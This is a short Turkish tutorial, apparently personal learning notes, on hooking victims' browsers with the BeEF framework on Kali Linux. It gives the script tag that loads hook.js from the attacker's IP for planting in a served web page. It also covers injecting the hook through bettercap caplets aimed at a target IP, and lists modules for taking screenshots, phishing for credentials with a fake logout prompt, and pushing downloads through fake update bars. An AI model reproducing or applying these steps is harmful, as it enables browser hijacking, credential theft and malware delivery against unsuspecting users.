# Beef 
---
#### Beef Hedef PC'nin arama motorunda JS kodu çalıştırır

#### 1.```beef-xss``` beef'i açıyoruz
#### 2. Beef'in sitesine üye olmamız gerekiyor
#### 3.```/var/www/html``` içerisinde ki ```inde.html``` açıyoruz
#### 4. İçerisine ```<script src="http://192.168.123.456:3000/hook.js"></script>``` yazıyoruz ```JS kodu içindeki IP Kalimizin IP'si olmalı```
#### 5. Artık bizim apache service'imize giren PC'leri Beef üzerinden görebiliriz

# JS Kodu Enjeksiyonu ve Sürekli İzleme
---
### ```usr/share/bettercap/caplets/beefcustom``` içerisindeki ```.js``` ve ```.cap``` dosyalarındaki kodları değiştiriyoruz
> ## .js içine kendi Kali IP'mizi yazıyoruz
![](https://github.com/ahmetnuysal/Cyber-Security/blob/7a72a371b14ce345df21530e7a7c3d676869afd1/WhatsApp%20Image%202022-08-28%20at%2011.59.29.jpeg)

> ## .cap içine hedef PC'nin IP'sini yazıyoruz
![](https://github.com/ahmetnuysal/Cyber-Security/blob/7a72a371b14ce345df21530e7a7c3d676869afd1/WhatsApp%20Image%202022-08-28%20at%2012.00.00.jpeg)



# Bazı Beef Komutları
---
* #### spydereye: Browser'ın SS'ini alır
* #### create alert dialog: Belirlenen mesajı hedef browser ekranına bastırır
* #### pretty theft: Sosyal medya hesabınızdan çıkış yapıldı bastırıp kullanıcı adı ve şifre ister
* #### fake notificatio bar: Hedefe fake bir güncelleme bildirimi yollayıp dosya indirebiliriz

                          
